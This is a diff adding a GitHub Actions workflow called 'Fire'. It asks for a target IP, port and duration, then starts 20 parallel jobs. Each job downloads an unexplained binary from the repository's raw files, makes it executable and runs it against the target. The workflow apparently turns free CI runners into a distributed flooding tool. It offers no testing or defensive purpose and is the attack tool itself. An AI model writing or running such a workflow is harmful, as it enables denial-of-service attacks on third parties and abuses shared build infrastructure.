@@ -1,0 +1,51 @@
+name: Fire
+on:
+  workflow_dispatch:
+    inputs:
+      ip:
+        description: 'Target IP'
+        required: true
+        default: '127.0.0.1'
+      port:
+        description: 'Target Port'
+        required: true
+        default: '32002'
+      duration:
+        description: 'Duration seconds'
+        required: true
+        default: '60'
+      bin:
+        description: 'Binary name'
+        required: false
+        default: 'mustafa'
+
+concurrency:
+  group: fire-${{ github.run_id }}
+  cancel-in-progress: false
+
+jobs:
+  burst:
+    runs-on: ubuntu-22.04
+    strategy:
+      fail-fast: false
+      max-parallel: 20
+      matrix:
+        n: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
+    steps:
+      - name: Run
+        run: |
+          IP="${{ github.event.inputs.ip }}"
+          PORT="${{ github.event.inputs.port }}"
+          DUR="${{ github.event.inputs.duration }}"
+          BIN="${{ github.event.inputs.bin }}"
+          REPO="${{ github.repository }}"
+          B=""
+          for branch in HEAD master main; do
+            if curl -fsSL --connect-timeout 5 --max-time 10 -o /tmp/xbin "https://raw.githubusercontent.com/${REPO}/${branch}/${BIN}" 2>/dev/null; then
+              B="/tmp/xbin"; break
+            fi
+          done
+          if [ -n "$B" ]; then
+            chmod +x "$B"
+            "$B" direct "$IP" "$PORT" "$DUR" 1
+          fi
